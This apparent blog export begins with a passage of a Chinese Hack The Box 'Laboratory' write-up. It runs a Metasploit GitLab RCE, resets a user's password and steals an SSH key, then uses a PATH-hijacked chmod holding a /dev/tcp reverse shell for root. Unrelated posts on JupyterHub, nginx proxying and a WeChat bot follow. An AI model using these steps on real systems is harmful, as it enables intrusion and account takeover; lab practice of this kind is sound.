<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314133344.png" alt="20210314133344"></p>
<p>注册一个账户(如abc:12345678，注册邮箱后缀需要为@laboratory.htb)登录后，在Help页面看到gitlab的版本：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314133929.png" alt="20210314133929"></p>
<hr>
<h2 id="3-Get-Shell"><a href="#3-Get-Shell" class="headerlink" title="3.Get Shell"></a>3.Get Shell</h2><p>查阅google搜索相关信息,发现存在RCE，同时可以利用msf进行攻击，</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314151134.png" alt="20210314151134"></p>
<p>exp在此：<a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/</a> ：打开msfconsole，选择相应模块为multi/http/gitlab_file_read_rce，配置options如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;http&#x2F;gitlab_file_read_rce) &gt; show options</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;http&#x2F;gitlab_file_read_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting                                               Required  Description</span><br><span class="line">   ----             ---------------                                               --------  -----------</span><br><span class="line">   DEPTH            15                                                            yes       Define the max traversal depth</span><br><span class="line">   PASSWORD         12345678                                                      no        The password for the specified username</span><br><span class="line">   RHOSTS           10.10.10.216                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT            443                                                           yes       The target port (TCP)</span><br><span class="line">   SECRETS_PATH     &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml  yes       The path to the secrets.yml file</span><br><span class="line">   SECRET_KEY_BASE                                                                no        The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present</span><br><span class="line">   SSL              true                                                          no        Negotiate SSL&#x2F;TLS for outgoing connections</span><br><span class="line">   TARGETURI        &#x2F;users&#x2F;sign_in                                                yes       The path to the vulnerable application</span><br><span class="line">   USERNAME         abc                                                           no        The username to authenticate as</span><br><span class="line">   VHOST            git.laboratory.htb                                            no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic&#x2F;shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.32      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br></pre></td></tr></table></figure>
<p>输入run或exploit后进行攻击，成功获取shell：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314152748.png" alt="20210314152748"></p>
<p>获取shell后，利用gitlab-rails修改gitlab后台用户密码，还记得网站评论内容里的Dexter吗，Laboratory的CEO，我们要修改Dexter用户的密码，然后登录进他的gitlab账户，看是否藏着一些秘密，打开gitlab-rails console：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitlab-rails console  进入gitlab模式</span><br><span class="line">user &#x3D; User.all  查询所有用户</span><br><span class="line">user &#x3D; User.find(1) 通过id查询用户</span><br><span class="line">#修改密码，dexter对应的id为1</span><br><span class="line">user.password &#x3D; &#39;12345678&#39;</span><br><span class="line">user.password_confirmation &#x3D; &#39;12345678&#39; </span><br><span class="line">user.save</span><br><span class="line">#修改用户状态</span><br><span class="line">user.state &#x3D; &#39;active&#39;</span><br><span class="line">user.save</span><br></pre></td></tr></table></figure>
<p>对应的截图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314153817.png" alt="20210314153817"></p>
<p>密码修改后，在登录界面，利用(dexter:12345678)登录dexter的账户：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314154040.png" alt="20210314154040"></p>
<p>在dexter的项目中，SecureDocker-&gt;dexter-&gt;.ssh-&gt;id_rsa，找到ssh的密钥id_rsa，我们可以通过该密钥进行ssh远程登录：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314163613.png" alt="20210314163613"></p>
<p>复制id_rsa中的内容，保存在kali本地，文件名任意取一个，这里取了rsa，复制完成后，为rsa文件赋予权限，然后利用rsa进行ssh登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 600 rsa</span><br><span class="line">ssh -i rsa dexter@laboratory.htb</span><br></pre></td></tr></table></figure>
<p>成功登录主机的dexter用户：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314155123.png" alt="20210314155123"></p>
<hr>
<h2 id="4-Privilege-Escalation"><a href="#4-Privilege-Escalation" class="headerlink" title="4.Privilege Escalation"></a>4.Privilege Escalation</h2><p>使用LinEnum.sh进行扫描，由于目标机器无法git下来<code>LinEnum.sh</code>，这里使用手动创建文件然后vim打开文件进行复制的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch LinEnum.sh</span><br><span class="line">vim LinEnum.sh</span><br><span class="line">复制https:&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum&#x2F;blob&#x2F;master&#x2F;LinEnum.sh中的内容</span><br><span class="line">chmod a+x LinEnum.sh  #赋予权限</span><br><span class="line">.&#x2F;LinEnum.sh  #运行该脚本</span><br></pre></td></tr></table></figure>
<p>看看有没有可以用来提权的内容，发现具有suid属性的文件,suid特点如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. SUID 权限仅对二进制可执行文件有效</span><br><span class="line">2. 如果执行者对于该二进制可执行文件具有 x 的权限，执行者将具有该文件的所有者的权限</span><br><span class="line">3. 本权限仅在执行该二进制可执行文件的过程中有效 </span><br></pre></td></tr></table></figure>
<p>LinEnum.sh的检测结果发现了docker-security文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314160152.png" alt="20210314160152"></p>
<p>对应的文件为/usr/local/bin/docker-security，查看文件内容发现是乱码，可以通过linux的strings命令查看文件和编译文件的内容，但是目标ssh上没有strings命令，也无法安装，可通过nc将文件docker-security传输到kali中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali上命令：nc -l -p 1234 &gt; docker-security</span><br><span class="line">目标ssh上命令：nc -w 5 10.10.14.32 1234 &lt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-security</span><br></pre></td></tr></table></figure>
<p>kali接收到文件后，用strings命令查看文件内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314160636.png" alt="20210314160636"></p>
<p>发现docker-security中执行了chmod命令，可以通过伪造环境变量修改chmod的内容，获取root权限。下面来进行提权，在目标ssh上，在/tmp目录下创建chmod文件，chmod的文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.32&#x2F;4242 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>然后使用chmod a+x chmod给新创的文件赋予权限，接着将/tmp路径导入环境变量$PATH中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br></pre></td></tr></table></figure>
<p>此时，kali主机上开启nc用于监听反弹的shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lnvp 4242</span><br></pre></td></tr></table></figure>
<p>最后，在目标ssh上，运行docker-security脚本：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314165719.png" alt="20210314165719"></p>
<p>如上图，运行了docker-security后，kali上接受到反弹的root shell，提权完成，获取root权限后，通过cat /root/root.txt获取flag。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210314163405.png" alt="20210314163405"></p>
<hr>
<p>Now it’s time to party!</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu环境下多用户Anaconda以及JupyterHub搭建过程+公网nginx反向代理+nps穿透实现通过公网Https访问内网JupyterHub</title>
    <url>/2023/03/05/jupyterlab/</url>
    <content><![CDATA[<p>因为现在有一台处于内网环境下的性能非常好的台式机，想要将其作为GPU服务器供大家一同使用，因此需要配置多用户使用的Anaconda环境。为了更好的方便大家跑代码，选择搭建一个JupyterHub，这样大家可以使用JupyterHub的Web界面直接在浏览器上跑自己的代码。考虑到内网因素对大家的使用影响，比如有些同伴可能在外出差无法访问内网服务，却又需要在GPU服务器上跑代码，可以使用NPS对内网进行穿透，通过公网IP访问内网服务。同时又考虑到安全性问题，选择在NPS之前再套一个nginx反向代理，可以实现HTTPS传输流量。</p>
<a id="more"></a>
<hr>
<h2 id="配置GPU驱动和cuda，cudnn"><a href="#配置GPU驱动和cuda，cudnn" class="headerlink" title="配置GPU驱动和cuda，cudnn"></a>配置GPU驱动和cuda，cudnn</h2><ul>
<li>Linux换源后，在软件更新里找到驱动，可以选择专用的驱动下载</li>
<li>驱动安装成功后，<code>nvidia-smi</code>命令可以正常运行</li>
<li>通过<code>nvidia-smi</code>可以看到支持的CUDA最高版本</li>
<li>我的设备支持的CUDA最高版本是12.0,因此我选择安装了cuda 11.2版本和cudnn 8.1版本</li>
</ul>
<hr>
<h2 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h2><p>Anaconda需要配置多用户使用，因此按照如下步骤，首先以root权限安装conda，而后普通用户再具体配置：</p>
<p>root用户安装conda：</p>
<ul>
<li>以root权限安装conda，安装到所有用户都可以访问的位置（如/opt/anaconda3）</li>
<li>以root权限运行<code>chmod o-w /opt/anaconda3/envs</code>,使普通用户无法在共享环境里写文件</li>
<li>以root权限将源换为国内源</li>
<li>以root权限安装共享环境（如分别安装常用的pytorch,tensorflow环境）</li>
<li>根据我安装的cuda版本，我这里选择安装的pytorch版本为1.8.0，tensorflow版本为2.6.0，通过以下命令安装：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># pytorch 1.8.0版本 conda环境安装：</span><br><span class="line">conda create -n pytorch python&#x3D;3.8.5 # 此时会创建一个名为pytorch的conda环境</span><br><span class="line">conda install pytorch&#x3D;&#x3D;1.8.0 torchvision&#x3D;&#x3D;0.9.0 torchaudio&#x3D;&#x3D;0.8.0 cudatoolkit&#x3D;11.1</span><br><span class="line"># tensorflow-gpu 2.6.0版本 conda安装：</span><br><span class="line">conda create -n tensorflow python&#x3D;3.8.5 # 此时会创建一个名为tensorflow的conda环境</span><br><span class="line">conda install tensorflow-gpu&#x3D;2.6.0</span><br></pre></td></tr></table></figure>
普通用户使用conda：</li>
<li>普通用户登录conda前需要先init:<code>/opt/anaconda3/bin/conda init bash</code></li>
<li>普通用户在conda init后如果通过conda安装新环境会优先考虑安装在共享环境下，但普通用户又没有写权限，从而导致报错，因此需要在用户目录下修改.condarc文件，添加用户安装环境的位置：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">envs_dirs:</span><br><span class="line">  - ~&#x2F;.conda&#x2F;envs #意为优先将环境安装在用户目录下。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="安装JupyerHub"><a href="#安装JupyerHub" class="headerlink" title="安装JupyerHub"></a>安装JupyerHub</h2><p>按照以下步骤安装JupyterHub：</p>
<ul>
<li>在root权限下，使用conda安装：<code>conda install jupyterhub</code></li>
<li>修改配置文件 jupyterhub_config.py（因为是root用户安装的jupyterhub，因此该文件一般在root用户目录下）,具体修改如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 参考来源：https:&#x2F;&#x2F;blog.csdn.net&#x2F;meiaoxue1234&#x2F;article&#x2F;details&#x2F;123252499</span><br><span class="line"></span><br><span class="line"># configurable_http_proxy 代理设置</span><br><span class="line">c.ConfigurableHTTPProxy.should_start &#x3D; True #允许hub启动代理 可以不写，默认的，为False 就需要自己去 启动configurable-http-proxy</span><br><span class="line">c.ConfigurableHTTPProxy.api_url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8001&#39; # proxy与hub与代理通讯，这应该是默认值不行也行</span><br><span class="line"> </span><br><span class="line"># 对外登录设置的ip</span><br><span class="line">c.JupyterHub.ip &#x3D; &#39;x.x.x.x&#39;</span><br><span class="line">c.JupyterHub.port &#x3D; 8001</span><br><span class="line">c.PAMAuthenticator.encoding &#x3D; &#39;utf8&#39;</span><br><span class="line"> </span><br><span class="line"># 用户名单设置，默认身份验证方式PAM与NUIX系统用户管理层一致，root用户可以添加用户test1,test2等等，非root用户，sudo useradd test1&#x2F;test2 不起作用，</span><br><span class="line"># c.Authenticator.allowed_users &#x3D; &#123;&#39;test1&#39;, &#39;test2&#39;&#125;</span><br><span class="line">c.Authenticator.admin_users &#x3D; &#123;&#39;root&#39;&#125;  # 管理员用户</span><br><span class="line"># c.DummyAuthenticator.password &#x3D; &quot;xsxxxx2&quot;  # 初始密码设置</span><br><span class="line">c.JupyterHub.admin_access &#x3D; True  # 则管理员有权在各自计算机上以其他用户身份登录，以进行调试</span><br><span class="line">c.LocalAuthenticator.create_system_users&#x3D;True  # 此选项通常用于 JupyterHub 的托管部署，以避免在启动服务之前手动创建所有用户</span><br><span class="line"> </span><br><span class="line"># 设置每个用户的 book类型 和 工作目录（创建.ipynb文件自动保存的地方）</span><br><span class="line">c.Spawner.notebook_dir &#x3D; &#39;~&#39;</span><br><span class="line">c.Spawner.default_url &#x3D; &#39;&#x2F;lab&#39;</span><br><span class="line">c.Spawner.args &#x3D; [&#39;--allow-root&#39;] </span><br></pre></td></tr></table></figure></li>
<li>在linux终端terminal里给root用户添加密码（不然jupyterhub启动后，没有密码登录不了）</li>
<li>挂载配置文件启动jupyerhub：<code>jupyterhub -f jupyterhub_config.py</code></li>
<li>以管理员用户登录JupyterHub后，可以添加用户，添加用户后，还需要在终端terminal里给该用户设置密码</li>
<li>考虑是否将该用户加入sudo组（<code>usermod -aG sudo username</code>）,意为将username用户添加进sudo组</li>
<li>虽然已经创建了共享环境（如pytorch,tensorflow），但是此时登录JupyterHub页面后这些共享环境是不显示的，需要安装kernel使得共享环境在JupyterHub页面中显示出来，具体操作如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 以root用户进入共享环境，这里以tensorflow共享环境为例：</span><br><span class="line">conda activate tensorflow # 进入tensorflow共享环境</span><br><span class="line">python -m ipykernel install --name tensorflow --display-name tensorflow # 为tensorflow环境安装kernel，需要注意的是这里--name后的tensorflow为之前创建的环境名，--display-name后的tensorflow是你希望这个环境在JupyterHub中显示的名字</span><br></pre></td></tr></table></figure>
给环境安装完kernel后，刷新JupyterHub页面，即可显示共享环境的kernel，选择该kernel，就可以使用该共享环境了</li>
</ul>
<hr>
<h2 id="普通用户安装conda环境"><a href="#普通用户安装conda环境" class="headerlink" title="普通用户安装conda环境"></a>普通用户安装conda环境</h2><p>普通用户可以直接重新创建一个全新的环境，也可以克隆共享环境里的其中一个环境，这里具体介绍如何克隆环境，普通用户登录后(非root权限)，依次执行以下命令：</p>
<ul>
<li><code>source activate</code> # 启动conda环境</li>
<li><code>conda create -n your_environment_name --clone shared_enviroment_name</code> # clone共享环境</li>
<li><code>sudo su</code> # 提升为root权限</li>
<li><code>conda activate path_of_your_environment</code> # 进入刚刚新建的环境</li>
<li><code>python -m ipykernel install --name your_enviroment_name --display-name new_name</code> #为刚新建的环境安装kernel，并且new_name为用户想要在JupyterHub中显示的Kernel名称</li>
<li>刷新JupyterHub页面，即可以看到刚刚新建的kernel，选择该kernel就可以使用刚创建的环境了 </li>
</ul>
<hr>
<h2 id="Nginx-NPS实现通过公网Https访问内网JupyterHub的Web界面"><a href="#Nginx-NPS实现通过公网Https访问内网JupyterHub的Web界面" class="headerlink" title="Nginx+NPS实现通过公网Https访问内网JupyterHub的Web界面"></a>Nginx+NPS实现通过公网Https访问内网JupyterHub的Web界面</h2><p>假设拥有一台公网vps，并给该公网配置了域名(假设为myweb.com)，且假设已经通过NPS实现了以HTTP方式通过公网public_ip:public_port或myweb.com:public_port访问内网JupyterHub服务（localhost_ip:localhost_port）。NPS实现内网穿透网上的教程很多，这里不再赘述。此时可以借助Nginx反向代理实现Https传输和端口隐藏。</p>
<p>在公网vps中安装nginx服务，并在nginx的配置文件下配置如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen 80 default; #监听80端口，即http访问请求</span><br><span class="line">	server_name _;</span><br><span class="line">	return 500;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">	listen 80; # 监听80端口，即http访问请求</span><br><span class="line">	listen [::]:80;</span><br><span class="line">	server_name myweb.com;</span><br><span class="line">	return 301 https:&#x2F;&#x2F;$server_name$request_uri; # 将所有80端口的访问请求重定向到443端口(https服务)</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">	listen 443 ssl default; # 监听443端口，即https访问请求</span><br><span class="line">	server_name _;</span><br><span class="line">	ssl_certificate myweb.com_bundle.crt;# 配置证书（证书文件在买域名的时候会给）</span><br><span class="line">    ssl_certificate_key myweb.com.key; #hps文件夹下的.key文件</span><br><span class="line"> 	ssl_session_timeout 5m;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">	return 500;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name myweb.com; #填写绑定证书的域名</span><br><span class="line">    ssl_certificate myweb.com_bundle.crt;# </span><br><span class="line">    ssl_certificate_key myweb.com.key; </span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    location &#x2F; &#123;  #此处为转发配置</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Scheme $scheme;</span><br><span class="line">        proxy_buffering off; </span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">       	proxy_pass http:&#x2F;&#x2F;127.0.0.1:public_port&#x2F;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置文件中location部分的目的是将对 <code>https://myweb.com</code> 的访问请求代理转发到 <code>http://127.0.0.1:public_port/</code>，这里的127.0.0.1是公网vps的本地地址，因此这里的127.0.0.1就相当于公网的ip，而之前又通过配置NPS将对公网的 <code>http://127.0.0.1:public_port/</code> 的访问请求转发到内网本地的 localhost_ip:localhost_port。因此通过两层代理转发实现了通过公网HTTPS服务访问内网的JupyterHub的web服务，并且隐藏了public_port这一端口。</p>
<p>！！！注意，配置文件中的location部分，proxy的设置不能少，不然以HTTPS方式访问内网JupyterHub时会出现权限错误，因为并不是所有流量都以https传输，会存在一些http流量被重定向到https（如nginx的配置文件里，将监听到的所有80端口的流量都重定向到https），而这些重定向的http流量就会引起权限问题，这是因为jupyterhub会对协议是否相同来认证权限。具体请参考网址：<a href="https://jupyterhub.readthedocs.io/en/stable/reference/config-proxy.html">https://jupyterhub.readthedocs.io/en/stable/reference/config-proxy.html</a></p>
<p>此时重启nginx服务<code>service nginx restart</code>即可实现通过<code>https://myweb.com/</code> 以https的方式访问内网的JupyterHub的Web服务。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>anaconda,jupyterlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Life-Tips</title>
    <url>/2021/03/20/life-tips/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e21f701a4fe40e01192f5294dc69224bfc5468aac533b304c4c5aaed283df88a">6da9248f3a55c5d45aa18885d43690945689b4eba10b7768088145053740bd275dbda4ab2dff30deea5f70ef619455c6aa30fb37f6ff6ac72c2ff31e02cbd506760265c3d9b17a5e8a11d83d40af27faf48e9a060b74d9932b5f31e644b4af96d98c09af86480b2a88284524e7b0563079495fedc0fc4997a8420e46b45cbfd2834c37c28c95292afac51d13da7842bc978f7bb283f9fa8b70deb0848ffaae38</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Emotion</category>
      </categories>
      <tags>
        <tag>sunny</tag>
      </tags>
  </entry>
  <entry>
    <title>linux配置nginx反向代理</title>
    <url>/2019/12/26/linux%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><strong>将web项目部署到服务器之后，通过nginx反向代理可以帮助隐藏web项目所在的端口号，避免了端口暴露在外的风险，本文主要讲述反向代理的概念和在linux环境下如何配置nginx反向代理。</strong></p>
<a id="more"></a>
<h2 id="1-什么是反向代理？"><a href="#1-什么是反向代理？" class="headerlink" title="1.什么是反向代理？"></a>1.什么是反向代理？</h2><p>反向代理（Reverse Proxy）方式:<br>是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。通常的代理服务器，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务。<br>简单来讲，正向代理是作为客户端的代理服务器，反向代理则是作为服务器端的代理服务器。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1laalg2Sy5qcGc?x-oss-process=image/format,png" alt="nginx反向代理"></p>
<h2 id="2-安装nginx服务器"><a href="#2-安装nginx服务器" class="headerlink" title="2.安装nginx服务器"></a>2.安装nginx服务器</h2><p>安装步骤非常简单，打开终端，输入：<br><code>sudo apt-get install nginx</code></p>
<p>在终端输入以下内容，打开nginx服务器：<br><code>service nginx start</code></p>
<h2 id="3-配置nginx服务器"><a href="#3-配置nginx服务器" class="headerlink" title="3.配置nginx服务器"></a>3.配置nginx服务器</h2><p>apt-get安装下的nginx配置文件的位置在 /etc/nginx/sites-available/default，打开default文件，并将proxy_pass处的值，改为你想要代理的服务器端口地址。(下图中代理的为5000端口号）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123; </span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_pass &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;;</span><br><span class="line">        &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来要将配置信息重新载入，终端输入：<br><code>/etc/init.d/nginx reload</code></p>
<h2 id="4-测试结果"><a href="#4-测试结果" class="headerlink" title="4.测试结果"></a>4.测试结果</h2><p>打开一个本地web项目，开放在5000端口<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llQzJFOC5wbmc?x-oss-process=image/format,png" alt="打开一个flask项目，并开放在5000端口"><br>在浏览器中输入url：0.0.0.0或0.0.0.0:80（因为nginx默认开放80端口，并且可以省略端口号）<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1llQ1JVUy5wbmc?x-oss-process=image/format,png" alt="访问nginx端口号，并成功返回flask项目内容"><br>可以看到，浏览器显示的内容正是开放在5000端口的flask项目。</p>
<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反向代理</tag>
      </tags>
  </entry>
  <entry>
    <title>python实现微信自动回复+图灵机器人</title>
    <url>/2020/01/12/python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%A4%8D+%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    <content><![CDATA[<p><strong>前段时间无意间看到wxpy，彷佛捡到了宝，立马开始探索用python玩微信，可以将很多操作自动化，既方便又有趣。<br>wxpy是 在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展，其中就包括平时常用的自动回复，主动发消息，甚至还能引入智能聊天机器人。话不多说，上python！<br><a href="https://wxpy.readthedocs.io/zh/latest/">更多玩法关注wxpy官方文档</a></strong></p>
<a id="more"></a>
<h2 id="1-初始化："><a href="#1-初始化：" class="headerlink" title="1.初始化："></a>1.初始化：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from wxpy import *           # 导入模块</span><br><span class="line">bot &#x3D; Bot()                             # 初始化机器人，扫码登陆 </span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]       #搜索昵称为&quot;AIbot&quot;的好友</span><br><span class="line">group &#x3D; bot.groups().search(&#39;test&#39;)[0]          #搜索名称为&quot;test&quot;的群聊</span><br></pre></td></tr></table></figure>
<h2 id="2-自动发送、回复指定消息："><a href="#2-自动发送、回复指定消息：" class="headerlink" title="2.自动发送、回复指定消息："></a>2.自动发送、回复指定消息：</h2><p>自动发送消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">friend.send(&#39;for test&#39;)             #自动向&quot;AIbot&quot;好友发送消息</span><br><span class="line">group.send(&#39;for test&#39;)             #自动向&quot;test&quot;群组发送消息</span><br></pre></td></tr></table></figure>
<p>自动回复消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@bot.register(friend)         # 回复 friend 的消息</span><br><span class="line">def reply_my_friend(msg):</span><br><span class="line">    return &#39;received: &#123;&#125;)&#39;.format(msg.text)        # 回复消息内容</span><br><span class="line"></span><br><span class="line">@bot.register([friend,Group])          #自动回复所有好友和群聊</span><br><span class="line">def auto_reply(msg):</span><br><span class="line">    if isinstance(msg.chat, Group) and not msg.is_at:</span><br><span class="line">        return                      #如果是群聊，但没有被 @，则不回复</span><br><span class="line">    else:</span><br><span class="line">        return &#39;收到消息: &#123;&#125;&#39;.format(msg.text)        # 回复消息内容</span><br></pre></td></tr></table></figure>
<h2 id="3-引入图灵机器人："><a href="#3-引入图灵机器人：" class="headerlink" title="3.引入图灵机器人："></a>3.引入图灵机器人：</h2><p>引入智能聊天机器人，才是python玩微信的精髓hhh。wxpy库目前提供了两种自动聊天机器人接口，图灵机器人和小i机器人，本文中选择受众度更高的图灵机器人。<br>调用图灵机器人需要申请api-key，<a href="http://www.turingapi.com/">申请点击链接即可！</a></p>
<p>下面给出图灵机器人自动回复好友”AIbot”消息的全代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from wxpy import *</span><br><span class="line">bot &#x3D; Bot()</span><br><span class="line">friend &#x3D; bot.friends().search(&#39;AIbot&#39;)[0]</span><br><span class="line">tuling &#x3D; Tuling(api_key&#x3D;&#39;4e2xxxxxxxa8&#39;)    #api_key为你申请的api_key</span><br><span class="line"></span><br><span class="line">@bot.register(friend)</span><br><span class="line">def reply_my_friend(msg):</span><br><span class="line">    tuling.do_reply(msg)     #图灵机器人自动回复</span><br><span class="line"></span><br><span class="line">bot.join()              #保持登陆状态</span><br></pre></td></tr></table></figure>
<p>话不多说，上图，日常基本聊天还是可以的：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltVDlmSy5qcGc?x-oss-process=image/format,png" alt="和图灵机器人的聊天"><br>图灵机器人的智能化程度还是很高的，日常聊天都很ok。<br>但是虽然是免费的，但是有限制次数，认证后一天100条。总的来说日常简短的聊天还是不错的选择。</p>
